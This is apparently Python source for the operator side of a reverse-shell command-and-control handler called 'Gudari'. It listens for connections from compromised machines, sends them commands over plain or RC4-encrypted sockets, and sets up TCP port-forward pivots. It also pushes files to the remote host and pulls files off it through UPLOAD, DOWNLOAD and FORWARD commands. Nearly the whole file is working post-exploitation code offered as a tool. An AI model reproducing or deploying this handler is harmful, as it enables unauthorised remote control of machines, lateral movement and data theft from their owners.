import socket
import threading
import sys
import time, select
from rc4 import *
import struct

#Class for standarize messages
class Msg:
    def info(m):
        print("[*] {0:s}".format(str(m)))

    def err(m):
        print("[-] {0:s}".format(str(m)))

    def warn(m):
        print("[!] {0:s}".format(str(m)))

    def ok(m):
        print("[+] {0:s}".format(str(m)))

    def dbg(m):
        print("dbg >>> {0:s}".format(str(m)))

#Class to store port forwardings
class TCPForward:
    LHOST=""
    RHOST=""
    LPORT=""
    RPORT=""
    ACTIVE=False
    SKT=socket.socket()
    SESS=socket.socket()

    def __init__(self, lhost, lport, rhost, rport):
        self.LHOST=lhost
        self.RHOST=rhost
        self.LPORT=lport
        self.RPORT=rport
    
    def stop(self):
        self.ACTIVE=False
        self.SKT.shutdown(socket.SHUT_RDWR)
        self.SKT.close()

    def forward(self, ctlSkt):        
        threading.Thread(target=self.doForward,args=[ctlSkt]).start()

    def doForward(self,ctlSkt):
        self.ACTIVE=True
        self.SKT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.SKT.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.SKT.bind(("0.0.0.0", int(self.LPORT)))
            Msg.info("Listening {0:s} port".format(self.LPORT))
            self.SKT.listen(1)

            while self.ACTIVE:
                # Asked to start the forward
                sock1, addrForwardEngine2 = self.SKT.accept()
                #Msg.ok("Connection received")
                ctlSkt.sktSend("FORWARD {0:s} {1:s} {2:s} {3:s}".format(self.RHOST, self.RPORT, self.LHOST, self.LPORT))
                sock2, addrForwardEngine = self.SKT.accept()
                #Msg.info("TCP forward tunnel established with {0:s} {1:s}".format(self.RHOST, self.RPORT))
                self.SKT.listen(0)
                inputs = [sock1, sock2]
                outputs = []
                lastData = time.time()
                while self.ACTIVE:
                    readable, writable, exceptional = select.select(inputs, outputs, inputs)
                    for s in readable:
                        if s is sock1:
                            sock1data = sock1.recv(1024)
                            if not sock1data:
                                break
                            sock2.send(sock1data)
                            lastData = time.time()
                        if s is sock2:
                            sock2data = sock2.recv(1024)
                            if not sock2data:
                                break
                            sock1.send(sock2data)
                            lastData = time.time()
                        
                    if lastData + 0.5 < time.time():
                        #Msg.err("[-] TCP forward tunnel TO")
                        sock1.shutdown(socket.SHUT_RDWR)
                        sock1.close()
                        sock2.shutdown(socket.SHUT_RDWR)
                        sock2.close()
                        self.SKT.listen(1)
                        break
        except Exception as e:
            print(e)
            Msg.dbg("Closing forward")
            self.ACTIVE=False
    
    
#Classes used to store the received connections
class RevHandler:
    LHOST=""
    LPORT=0
    RHOST=""
    sock=socket.socket()    
    TYPE="basic"
    CONNECTED=False
    busy=True

    def __init__(self, lhost, lport):
        self.LHOST=lhost
        self.LPORT=lport
    
    def sktRecv(self, s):
        try:
            while self.CONNECTED:
                data = s.recv(1024)
                if not data:
                    Msg.err("Port: {0:d} Session terminated".format(self.LPORT))
                    return
                dataResponse = str(data.decode(errors='ignore'))
                if "Response End" in dataResponse:
                    dataResponse = dataResponse.replace("Response End","")
                    print(dataResponse+"\n", end=" ")
                    self.busy = False
                else:
                    print(dataResponse+"\n", end=" ")
                sys.stdout.flush()
        except KeyboardInterrupt:
            return
        except:
            Msg.dbg(threading.currentThread().name)
            Msg.warn("Leaving connection")
            return            

    def sktSend(self, data):
        self.sock.send(data.encode())
        self.busy = True

    def connect(self):
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)            
            s.setblocking(1)
            s.settimeout(30)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((self.LHOST, self.LPORT))
            s.listen(1)
            conn, addr = s.accept()

            Msg.ok("Connected from {0:s}".format(str(addr)))
            self.CONNECTED=True
            threading.Thread(target=self.sktRecv,args=(conn,)).start()
            self.sock=conn
            self.RHOST=addr
            return conn
        except KeyboardInterrupt:
            Msg.warn("Connection cancelled")
            return False        
        except:
            Msg.err("Connection Error")
            return False

    def disconnect(self):
        Msg.info("Closing connection...")
        self.CONNECTED=False
        try:
            self.sock.shutdown(socket.SHUT_RDWR)
            self.sock.close()            
        except:
            Msg.warn("Socket already closed!")

    def getLHost(self):
        return self.LHOST

    def getRHost(self):
        return self.RHOST

class RevHandlerRC4:
    LHOST=""
    LPORT=0
    RHOST=""
    sock=socket.socket()    
    TYPE="basic"
    CONNECTED=False
    password=""
    busy=True

    def __init__(self, lhost, lport, password):
        self.LHOST=lhost
        self.LPORT=lport
        self.password=password
    
    def sktRecv(self, s):
        try:
            while self.CONNECTED:
                data = s.recv(2)
                if not data:
                    Msg.err("Port: {0:d} Session terminated".format(self.LPORT))
                    return
                print(data[:2])
                receiveSize = struct.unpack("<H",data[:2])[0]
                data = s.recv(receiveSize)
                if receiveSize != 1:
                    print("Recibiendo {} \m".format(receiveSize))
                    plaintext = rc4Decrypt(data, bytes(str(self.password), 'utf-8'))
                    if "Response End" in plaintext.encode("utf-8").decode('utf-8'):
                        #print("Fin de respuesta")
                        self.busy=False
                    else:
                    	print(plaintext.encode("utf-8").decode('utf-8')+"\n", end=" ")
                    sys.stdout.flush()
        except KeyboardInterrupt:
            return
        except:
            Msg.dbg(threading.currentThread().name)
            Msg.warn("Leaving connection")
            return            

    def sktSend(self, data):     
        cifrado = RC4Encrypt(self.password, data)
        #print(str(rawbytes(cifrado)))
        rawBytes = rawbytes(cifrado)
        i = rawBytes.find(b'\x00')
        while i != -1:
            print("Encontrado: "+str(i))
            rawBytes = rawBytes[:i]+rawBytes[i+1:]
            i = rawBytes.find(b'\x00')
        self.sock.send(struct.pack("<H", len(data))+rawBytes)
        self.busy=True

    def connect(self):
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)            
            s.setblocking(1)
            s.settimeout(30)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((self.LHOST, self.LPORT))
            s.listen(1)
            conn, addr = s.accept()

            Msg.ok("Connected from {0:s}".format(str(addr)))
            self.CONNECTED=True
            threading.Thread(target=self.sktRecv,args=(conn,)).start()
            self.sock=conn
            self.RHOST=addr
            return conn
        except KeyboardInterrupt:
            Msg.warn("Connection cancelled")
            return False        
        except:
            Msg.err("Connection Error")
            return False

    def disconnect(self):
        Msg.info("Closing connection...")
        self.CONNECTED=False
        try:
            self.sock.shutdown(socket.SHUT_RDWR)
            self.sock.close()            
        except:
            Msg.warn("Socket already closed!")

    def getLHost(self):
        return self.LHOST

    def getRHost(self):
        return self.RHOST

class GudariHandler(RevHandler):
    FORWARDS=[]

    def __init__(self, lhost, lport):
        RevHandler.__init__(self, lhost, lport)
        self.TYPE="gudari"
    
    def showForward(self):
        # need to return a array of array to make a table
        data=[["ID","LPORT","RHOST","RPORT"]]
        id=0
        for x in self.FORWARDS:
            if x.ACTIVE: data.append([str(id),x.LPORT, x.RHOST, x.RPORT])
            id+=1
        return data
    
    def stopForward(self, id):        
        self.FORWARDS[id].stop()
        del self.FORWARDS[id]        
        Msg.info("Forwarding disabled")
    
    def disconnect(self):
        Msg.info("Closing connection...")
        self.CONNECTED=False
        try:
            #disconnecting the forwards
            for x in self.FORWARDS:                
                x.stop()
            self.sock.shutdown(socket.SHUT_RDWR)
            self.sock.close()            
        except:
            Msg.warn("Socket already closed!")

    def uploader(self, skt, fil):
        try:
            with open(fil,'rb') as f:
                # File transfer
                data = f.read(1024)
                while data:
                    skt.send(data)
                    data = f.read(1024)
            f.close()
            skt.shutdown(socket.SHUT_RDWR)
            skt.close()
            Msg.ok("File uploaded")
        except Exception as e:
            Msg.err("Error uploading the file")
            Msg.err(e)

    def downloader(self, skt, fil):
        try:
            with open(fil,'wb') as f:
                    print("[+] Writing "+fil)
                    # File transfer
                    while True:
                        data = skt.recv(1024)
                        if not data:
                            break
                        f.write(data)
            f.close()
            skt.shutdown(socket.SHUT_RDWR)
            skt.close()
            Msg.ok("File downloaded")
        except:
            Msg.err("Error downloading the file")
            Msg.err(e)

    def downloadFile(self, lhost, trport, fname, ldir):
        Msg.info("Downloading File....")
        try:
            fileEngine = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            fileEngine.bind((lhost,int(trport)))
            #Send the required command through the socket
            self.sktSend(self, "DOWNLOAD {0:s} {1:s} {2:s}".format(lhost, trport, fname).encode())
            fileEngine.listen(1)
            sdwn, addrFileEngine = fileEngine.accept()
            Msg.ok("File transfer tunnel estableshed with "+str(addrFileEngine))
            #get the last part of the filename
            try:    
                filename=ldir+"/"+fname.split("\\")[-1]
            except:
                filename=ldir+"/"+fname.split("/")[-1]
            
            threading.Thread(target=self.downloader,args=[sdwn, filename]).start()                    
        except KeyboardInterrupt:
            Msg.warn("Connection cancelled")
            return False                
        except Exception as e:
            Msg.err(e)        
    
    def uploadFile(self, lhost, trport, fname, rdir):
        Msg.info("Uploading File...")
        try:
            Msg.info("Opening {0:s}".format(fname))
            fileEngine = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            fileEngine.bind((lhost, int(trport)))        
            # need to find the filename part
            filename=fname.split("/")[-1]        
            rfile=rdir+"\\"+filename
            Msg.dbg(filename)
            Msg.dbg(rfile)        
            # upload tunnel command
            self.sock.send("UPLOAD {0:s} {1:s} {2:s}".format(lhost, trport, rfile).encode())
            fileEngine.listen(1)
            supl, addrFileEngine = fileEngine.accept()
            Msg.ok("File transfer tunnel established with "+str(addrFileEngine))
            threading.Thread(target=self.uploader,args=[supl, fname]).start()
        except KeyboardInterrupt:
            Msg.warn("Connection cancelled")
            return False                
        except Exception as e:
            Msg.err(e)

    def addForward(self, lhost, lport, rhost, rport):
        Msg.info("Enabling port forwarding")
        self.FORWARDS.append(TCPForward(lhost, lport, rhost, rport))
        self.FORWARDS[-1].forward(self)
        Msg.info("FORWARD RUNNING")
        
class GudariRC4Handler(RevHandlerRC4):
    FORWARDS=[]

    def __init__(self, lhost, lport, password):
        RevHandlerRC4.__init__(self, lhost, lport, password)
        self.TYPE="gudari"
    
    def showForward(self):
        # need to return a array of array to make a table
        data=[["ID","LPORT","RHOST","RPORT"]]
        id=0
        for x in self.FORWARDS:
            if x.ACTIVE: data.append([str(id),x.LPORT, x.RHOST, x.RPORT])
            id+=1
        return data
    
    def stopForward(self, id):        
        self.FORWARDS[id].stop()
        del self.FORWARDS[id]        
        Msg.info("Forwarding disabled")
    
    def disconnect(self):
        Msg.info("Closing connection...")
        self.CONNECTED=False
        try:
            #disconnecting the forwards
            for x in self.FORWARDS:                
                x.stop()
            self.sock.shutdown(socket.SHUT_RDWR)
            self.sock.close()            
        except:
            Msg.warn("Socket already closed!")

    def uploader(self, skt, fil):
        try:
            with open(fil,'rb') as f:
                # File transfer
                data = f.read(1024)
                while data:
                    skt.send(data)
                    data = f.read(1024)
            f.close()
            skt.shutdown(socket.SHUT_RDWR)
            skt.close()
            Msg.ok("File uploaded")
        except Exception as e:
            Msg.err("Error uploading the file")
            Msg.err(e)

    def downloader(self, skt, fil):
        try:
            with open(fil,'wb') as f:
                    print("[+] Writing "+fil)
                    # File transfer
                    while True:
                        data = skt.recv(1024)
                        if not data:
                            break
                        f.write(data)
            f.close()
            skt.shutdown(socket.SHUT_RDWR)
            skt.close()
            Msg.ok("File downloaded")
        except:
            Msg.err("Error downloading the file")
            Msg.err(e)

    def downloadFile(self, lhost, trport, fname, ldir):
        Msg.info("Downloading File....")
        try:
            fileEngine = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            fileEngine.bind((lhost,int(trport)))
            #Send the required command through the socket
            self.sktSend("DOWNLOAD {0:s} {1:s} {2:s}".format(lhost, trport, fname))
            fileEngine.listen(1)
            sdwn, addrFileEngine = fileEngine.accept()
            Msg.ok("File transfer tunnel estableshed with "+str(addrFileEngine))
            #get the last part of the filename
            try:    
                filename=ldir+"/"+fname.split("\\")[-1]
            except:
                filename=ldir+"/"+fname.split("/")[-1]
            
            threading.Thread(target=self.downloader,args=[sdwn, filename]).start()                    
        except KeyboardInterrupt:
            Msg.warn("Connection cancelled")
            return False                
        except Exception as e:
            Msg.err(e)        
    
    def uploadFile(self, lhost, trport, fname, rdir):
        Msg.info("Uploading File...")
        try:
            Msg.info("Opening {0:s}".format(fname))
            fileEngine = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            fileEngine.bind((lhost, int(trport)))        
            # need to find the filename part
            filename=fname.split("/")[-1]        
            rfile=rdir+"\\"+filename
            Msg.dbg(filename)
            Msg.dbg(rfile)        
            # upload tunnel command
            self.sktSend("UPLOAD {0:s} {1:s} {2:s}".format(lhost, trport, rfile))
            fileEngine.listen(1)
            supl, addrFileEngine = fileEngine.accept()
            Msg.ok("File transfer tunnel established with "+str(addrFileEngine))
            threading.Thread(target=self.uploader,args=[supl, fname]).start()
        except KeyboardInterrupt:
            Msg.warn("Connection cancelled")
            return False                
        except Exception as e:
            Msg.err(e)

    def addForward(self, lhost, lport, rhost, rport):
        Msg.info("Enabling port forwarding")
        self.FORWARDS.append(TCPForward(lhost, lport, rhost, rport))
        self.FORWARDS[-1].forward(self)
        Msg.info("FORWARD RUNNING")

class GudariShell(RevHandler): 
    def __init__(self, lhost, lport, sType):
        RevHandler.__init__(self, lhost, lport)        
        self.TYPE=sType

    def sktRecv(self, s):
        try:
            while self.CONNECTED:
                data = s.recv(1024)
                if not data:
                    Msg.err("Port: {0:d} Session terminated".format(self.LPORT))
                    return
                print(str(data.decode(errors='ignore')),end="")
                sys.stdout.flush()
        except KeyboardInterrupt:
            return
        except:
            Msg.warn("Leaving connection")
            return

